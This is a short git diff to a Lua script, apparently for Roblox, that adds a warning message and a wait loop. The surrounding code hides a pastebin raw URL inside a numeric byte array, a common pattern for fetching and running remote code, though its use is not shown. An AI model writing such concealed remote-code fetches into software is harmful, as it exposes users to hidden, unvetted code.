3ac9bd47b4468ade1fb25d905a275edddafb6178
MaybeHookUser <IUseMaybeHook@proton.me>
2026-01-17 15:31:05 +0100

    Update Mobile.lua

--- Mobile.lua
+++ Mobile.lua
@@ -1,3 +1,4 @@
+warn("Detected mobile..")
 local l1l1ll1 = game:GetService("Players").LocalPlayer
 local UIS = game:GetService("UserInputService")
 
@@ -16,6 +17,10 @@ end
 
 _G.SESSION_TOKEN = math.random(100000, 999999)
 _G.Processor = math.random(1000, 9000)
+
+repeat
+    task.wait(0.1)
+until _G.SESSION_TOKEN and _G.Processor
 
 local _raw = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 119, 50, 109, 115, 66, 76, 113, 51}
 local _url = ""
